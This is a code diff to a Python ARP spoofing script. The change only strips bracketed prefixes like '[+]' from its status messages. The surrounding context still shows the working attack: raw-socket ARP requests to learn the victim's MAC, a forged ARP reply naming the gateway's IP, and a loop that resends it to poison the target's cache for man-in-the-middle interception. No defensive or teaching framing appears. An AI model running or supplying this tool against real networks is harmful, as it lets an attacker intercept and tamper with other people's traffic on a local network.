@@ -12,7 +12,7 @@ def get_interface_mac(interface):
     return info[18:24]
 
 def get_mac(ip, interface='eth0'):
-    print(f"[>] Resolving MAC address for {ip} via interface {interface}...")
+    print(f"Resolving MAC address for {ip} via interface {interface}...")
 
     try:
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
@@ -40,7 +40,7 @@ def get_mac(ip, interface='eth0'):
 
         packet = eth_header + arp_header
 
-        print(f"[>] Sending ARP request for {ip}...")
+        print(f"Sending ARP request for {ip}...")
         s.send(packet)
 
         s.settimeout(3)
@@ -50,13 +50,13 @@ def get_mac(ip, interface='eth0'):
                 sender_ip = raw[28:32]
                 if sender_ip == dest_ip:
                     mac = raw[6:12]
-                    print(f"[+] MAC for {ip} is {binascii.hexlify(mac).decode()}")
+                    print(f"MAC for {ip} is {binascii.hexlify(mac).decode()}")
                     return mac
     except socket.timeout:
-        print(f"[!] Timeout: No ARP reply from {ip}")
+        print(f"Timeout: No ARP reply from {ip}")
         sys.exit(1)
     except Exception as e:
-        print(f"[!] Error while getting MAC for {ip}: {e}")
+        print(f"Error while getting MAC for {ip}: {e}")
         sys.exit(1)
 
 
@@ -72,12 +72,12 @@ def create_arp_packet(target_ip, spoof_ip, source_mac, target_mac):
     return eth_header + arp_payload
 
 def arp_spoof(target_ip, gateway_ip, interface='eth0', interval=2):
-    print(f"[+] Getting MAC addresses...")
+    print(f"Getting MAC addresses...")
     source_mac = get_interface_mac(interface)
     target_mac = get_mac(target_ip, interface)
 
-    print(f"[+] Target MAC: {binascii.hexlify(target_mac).decode()}")
-    print(f"[+] Gateway IP: {gateway_ip}")
+    print(f"Target MAC: {binascii.hexlify(target_mac).decode()}")
+    print(f"Gateway IP: {gateway_ip}")
 
     packet = create_arp_packet(target_ip, gateway_ip, source_mac, target_mac)
 
@@ -85,13 +85,13 @@ def arp_spoof(target_ip, gateway_ip, interface='eth0', interval=2):
     sock.bind((interface, 0))
 
     try:
-        print("[*] Starting spoofing... Press Ctrl+C to stop.")
+        print("Starting spoofing... Press Ctrl+C to stop.")
         while True:
             sock.send(packet)
-            print(f"[+] Sent ARP reply to {target_ip}")
+            print(f"Sent ARP reply to {target_ip}")
             time.sleep(interval)
     except KeyboardInterrupt:
-        print("\n[!] Stopping spoofing.")
+        print("\nStopping spoofing.")
         sock.close()
         sys.exit(0)
 
@@ -114,7 +114,7 @@ if __name__ == "__main__":
     interface = input("Enter interface (default: eth0): ").strip() or 'eth0'
 
     if not validate_ip(target_ip) or not validate_ip(gateway_ip):
-        print("[-] Invalid IP address format.")
+        print("Invalid IP address format.")
         sys.exit(1)
 
     arp_spoof(target_ip, gateway_ip, interface)
